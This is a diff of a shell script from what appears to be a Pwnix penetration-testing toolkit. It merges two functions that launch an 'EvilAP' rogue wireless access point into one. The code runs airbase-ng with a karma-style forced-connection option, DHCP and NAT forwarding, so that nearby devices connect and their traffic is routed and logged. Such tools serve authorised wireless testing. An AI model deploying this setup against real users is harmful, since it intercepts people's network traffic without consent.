@@ -115,54 +115,6 @@ f_logname(){
   printf "/opt/pwnix/captures/wireless/evilap-$(date +%s).log\n"
 }
 
-f_evilap(){
-  #Log path and name
-  logname=$(f_logname)
-  printf "[+] Creating new logfile: $logname\n"
-
-  #Start Airbase-ng with -P for preferred networks
-  airbase-ng -P -C $brate -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
-  sleep 2
-
-  #Bring up virtual interface at0
-  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0
-
-  #Start DHCP server on at0
-  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
-
-  if [ -n "${interface}" ]; then
-    #IP forwarding and iptables routing using internet connection
-    printf 1 > /proc/sys/net/ipv4/ip_forward
-    iptables -t nat -A POSTROUTING -o ${interface} -j MASQUERADE
-  fi
-
-  tail -f $logname
-}
-
-f_niceap(){
-  #Log path and name
-  logname=$(f_logname)
-  printf "[+] Creating new logfile: $logname\n"
-
-  #Start Airbase-ng with -P for preferred networks
-  airbase-ng -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
-  sleep 2
-
-  #Bring up virtual interface at0
-  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0
-
-  #Start DHCP server on at0
-  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
-
-  if [ -n "${interface}" ]; then
-    #IP forwarding and iptables routing using internet connection
-    printf 1 > /proc/sys/net/ipv4/ip_forward
-    iptables -t nat -A POSTROUTING -o ${interface} -j MASQUERADE
-  fi
-
-  tail -f $logname
-}
-
 f_karmaornot(){
   if [ -d /var/lib/dhcp ] && [ ! -f /var/lib/dhcp/dhcpd.leases ]; then
     touch /var/lib/dhcp/dhcpd.leases
@@ -178,19 +130,40 @@ f_karmaornot(){
       printf "[+] Starting EvilAP with forced connection attack\n"
       f_beacon_rate
       f_preplaunch
-      trap f_endclean INT
-      trap f_endclean KILL
-      f_evilap
+      evil_flags="-P -C $brate"
       ;;
     2)
       printf "[+] Starting EvilAP without forced connection attack\n"
       f_preplaunch
-      trap f_endclean INT
-      trap f_endclean KILL
-      f_niceap
+      evil_flags=""
       ;;
     *) f_karmaornot ;;
   esac
+
+  #Log path and name
+  logname=$(f_logname)
+  printf "[+] Creating new logfile: $logname\n"
+
+  trap f_endclean INT
+  trap f_endclean KILL
+
+  #Start Airbase-ng with -P for preferred networks
+  airbase-ng $evil_flags -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
+  sleep 2
+
+  #Bring up virtual interface at0
+  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0
+
+  #Start DHCP server on at0
+  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
+
+  if [ -n "${interface}" ]; then
+    #IP forwarding and iptables routing using internet connection
+    printf 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -t nat -A POSTROUTING -o ${interface} -j MASQUERADE
+  fi
+
+  tail -f $logname
 }
 
 f_mon_enable
